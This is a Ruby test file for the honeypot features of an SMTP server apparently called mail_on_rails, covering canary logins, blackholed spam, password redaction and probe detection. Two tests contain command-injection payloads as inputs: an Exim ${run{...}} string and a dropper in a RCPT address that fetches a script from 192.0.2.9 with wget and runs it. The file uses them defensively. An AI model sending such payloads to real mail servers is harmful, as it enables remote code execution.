require "test_helper"
require "logger"
require "mail_on_rails/smtp_server"
require "mail_on_rails/smtp/store/memory"

# Honeypot behavior on the SMTP session: a canary login is observed and its
# submission blackholed, exploit-probe payloads are recorded and refused, and
# a deceptive banner can replace the greeting. Driven directly over a loopback
# socket against the reference store - no Rails, no database.
class SmtpHoneypotSessionTest < Minitest::Test
  CANARY = "admin@example.test"
  PASSWORD = "pw-123456"

  def setup
    @store = MailOnRails::Smtp::Store::Memory.new
    @store.add_account(email: CANARY, password: PASSWORD, honeypot: true)
    @store.add_account(email: "real@example.test", password: PASSWORD)
  end

  # Runs the session in a thread, keeps a reference so the test can call the
  # teardown hook (finalize_honeypot) the real Server would call, and yields
  # the client socket.
  def with_session(role: :submission, spec_extra: { tls: :implicit })
    server = TCPServer.new("127.0.0.1", 0)
    client = TCPSocket.new("127.0.0.1", server.addr[1])
    session_socket = server.accept
    spec = { host: "127.0.0.1", port: server.addr[1], tls: :starttls, role: role, hostname: "mx.test" }.merge(spec_extra)
    @session = MailOnRails::SmtpServer::Session.new(session_socket, @store, spec, nil)
    thread = Thread.new { @session.run }
    yield client
  ensure
    client&.close
    thread&.join(5)
    @session&.finalize_honeypot # the Server calls this at teardown
    server&.close
  end

  def read_reply(client)
    lines = []
    while (line = client.gets("\r\n"))
      lines << line
      break if line[3] == " "
    end
    lines.join
  end

  def command(client, line)
    client.write("#{line}\r\n")
    read_reply(client)
  end

  def authenticate(client, email, password)
    command(client, "EHLO client.test")
    command(client, "AUTH PLAIN #{[ "\0#{email}\0#{password}" ].pack("m0")}")
  end

  def test_canary_login_is_recorded_banned_ready_and_session_continues
    with_session do |client|
      read_reply(client)
      assert_match(/\A235/, authenticate(client, CANARY, PASSWORD))
      command(client, "QUIT")
    end

    assert_equal 1, @store.honeypot_events.size
    event = @store.honeypot_events.first
    assert_equal "canary_auth", event[:trigger]
    assert_equal "smtp", event[:protocol]
    assert_equal CANARY, event[:username]
    assert_equal "127.0.0.1", event[:ip]
  end

  def test_canary_submission_is_blackholed
    with_session do |client|
      read_reply(client)
      authenticate(client, CANARY, PASSWORD)
      assert_match(/\A250/, command(client, "MAIL FROM:<#{CANARY}>"))
      assert_match(/\A250/, command(client, "RCPT TO:<victim@remote.test>"))
      assert_match(/\A354/, command(client, "DATA"))
      client.write("Subject: spam\r\n\r\nbuy pills\r\n.\r\n")
      assert_match(/\A250 2\.0\.0 Ok: queued as/, read_reply(client))
      command(client, "QUIT")
    end

    assert_empty @store.outbound_messages, "canary submission must not relay"
    assert_empty @store.inbound_messages, "canary submission must not be stored"
    # The full transcript (flushed at teardown) captures the relay attempt.
    transcript = @store.honeypot_events.first[:transcript]
    assert_includes transcript, "RCPT TO: victim@remote.test"
    assert_includes transcript, "buy pills"
  end

  # The fake queue id must not fingerprint the blackhole: a real acceptance
  # answers "queued as <InboundEmail id>" for local recipients and "queued
  # as outbound" for a relay, never a hex token.
  def test_blackholed_reply_id_has_the_shape_of_a_real_acceptance
    with_session do |client|
      read_reply(client)
      authenticate(client, CANARY, PASSWORD)
      command(client, "MAIL FROM:<#{CANARY}>")
      command(client, "RCPT TO:<victim@remote.test>")
      command(client, "DATA")
      client.write("Subject: spam\r\n\r\nbuy pills\r\n.\r\n")
      assert_match(/\A250 2\.0\.0 Ok: queued as outbound\r\n\z/, read_reply(client))

      command(client, "MAIL FROM:<#{CANARY}>")
      command(client, "RCPT TO:<real@example.test>")
      command(client, "DATA")
      client.write("Subject: spam\r\n\r\nbuy pills\r\n.\r\n")
      assert_match(/\A250 2\.0\.0 Ok: queued as \d+\r\n\z/, read_reply(client))
      command(client, "QUIT")
    end

    assert_empty @store.outbound_messages
    assert_empty @store.inbound_messages
  end

  def test_transcript_redacts_the_password
    with_session do |client|
      read_reply(client)
      authenticate(client, CANARY, PASSWORD)
      command(client, "QUIT")
    end

    transcript = @store.honeypot_events.first[:transcript]
    assert_includes transcript, "AUTH PLAIN [redacted]"
    refute_includes transcript, PASSWORD
  end

  def test_a_normal_account_login_records_nothing
    with_session do |client|
      read_reply(client)
      authenticate(client, "real@example.test", PASSWORD)
      command(client, "QUIT")
    end

    assert_empty @store.honeypot_events
  end

  def test_exploit_probe_is_recorded_and_refused_without_dispatch
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      reply = command(client, "MAIL FROM:<${run{/bin/sh -c id}}@evil.test>")
      assert_match(/\A502/, reply, "probe must be refused, not dispatched as MAIL")
      command(client, "QUIT")
    end

    assert_equal 1, @store.honeypot_events.size
    event = @store.honeypot_events.first
    assert_equal "exploit_probe", event[:trigger]
    assert_equal "exim_run", event[:signature]
  end

  # The dropper shape seen against production: command substitution with no
  # system path in it, smuggled through a quoted RCPT local-part. Recorded
  # and refused before rcpt_to ever sees it.
  def test_shell_dropper_in_rcpt_local_part_is_recorded_and_refused
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      command(client, "MAIL FROM:<hello@info.test>")
      reply = command(client, 'RCPT TO:<"x: Service status change: localhost $(nohup wget -qO - ' \
                              'http://192.0.2.9/zed | perl &) changed from stopped to running"@cve.invalid>')
      assert_match(/\A502/, reply, "probe must be refused, not dispatched as RCPT")
      command(client, "QUIT")
    end

    assert_equal 1, @store.honeypot_events.size
    assert_equal "command_substitution", @store.honeypot_events.first[:signature]
  end

  def test_vrfy_root_reconnaissance_is_flagged
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      reply = command(client, "VRFY root")
      # Same reply an innocuous VRFY gets, so recon targets can't
      # fingerprint the honeypot by comparing answers.
      assert_match(/\A252 /, reply)
      command(client, "QUIT")
    end

    assert_equal "vrfy_privileged", @store.honeypot_events.first[:signature]
  end

  def test_vrfy_probe_reply_follows_the_configured_vrfy_response
    MailOnRails::Settings.overrides = { smtp_vrfy_response: "502" }
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      assert_match(/\A502 /, command(client, "VRFY root"))
      command(client, "QUIT")
    end

    assert_equal "vrfy_privileged", @store.honeypot_events.first[:signature]
  ensure
    MailOnRails::Settings.reset!
  end

  def test_deceptive_banner_replaces_the_greeting
    with_session(role: :mx, spec_extra: { honeypot_banner: "Exim 4.80" }) do |client|
      assert_match(/\A220 Exim 4\.80/, read_reply(client))
      command(client, "QUIT")
    end
  end

  # An HTTP scanner's request line: refused like any probe and recorded
  # under its own trigger, so protocol_auto_ban can act on it.
  def test_http_request_at_the_smtp_port_is_recorded_as_a_foreign_protocol
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      assert_match(/\A502/, command(client, "GET / HTTP/1.1"))
      command(client, "Host: mx.test")
      command(client, "QUIT")
    end

    assert_equal 1, @store.honeypot_events.size, "one event per session, not per line"
    event = @store.honeypot_events.first
    assert_equal "foreign_protocol", event[:trigger]
    assert_equal "http_request", event[:signature]
    assert_includes event[:transcript], "<= GET / HTTP/1.1"
  end

  # A scanner's binary blob (here a TLS ClientHello on the plaintext port)
  # carries no CRLF, so it reaches the session as one unterminated chunk at
  # EOF. It used to be blanked before the probe check ever saw it; now it
  # is recorded and named.
  def test_tls_handshake_on_the_plaintext_port_is_recorded_from_an_unterminated_chunk
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      client.write("\x16\x03\x01\x00\xf4\x01\x00\x00\xf0\x03\x03\xff\xfe".b)
      client.close_write
      client.read # drain until the session closes
    end

    event = @store.honeypot_events.first
    assert_equal "foreign_protocol", event[:trigger]
    assert_equal "tls_handshake", event[:signature]
    refute_equal "session_error", @session.instance_variable_get(:@close_reason)
  end

  # Garbage is recorded but still dispatched - the parser's own refusal
  # (502 unknown command here, a 501 for a NUL inside an address) is the
  # reply, so the existing syntax-error behaviour is unchanged.
  def test_garbage_bytes_are_recorded_and_refused_without_a_session_error
    with_session(role: :mx, spec_extra: {}) do |client|
      read_reply(client)
      assert_match(/\A50[0-2]/, command(client, "b\x00/{m<;s3gMm>.4 ;1"))
      assert_match(/\A50[0-2]/, command(client, "\xff\xfe junk".b))
      assert_match(/\A221/, command(client, "QUIT"), "the session is still usable afterwards")
    end

    event = @store.honeypot_events.first
    assert_equal "garbage", event[:trigger]
    assert_equal "control_bytes", event[:signature]
    refute_equal "session_error", @session.instance_variable_get(:@close_reason)
  end
end
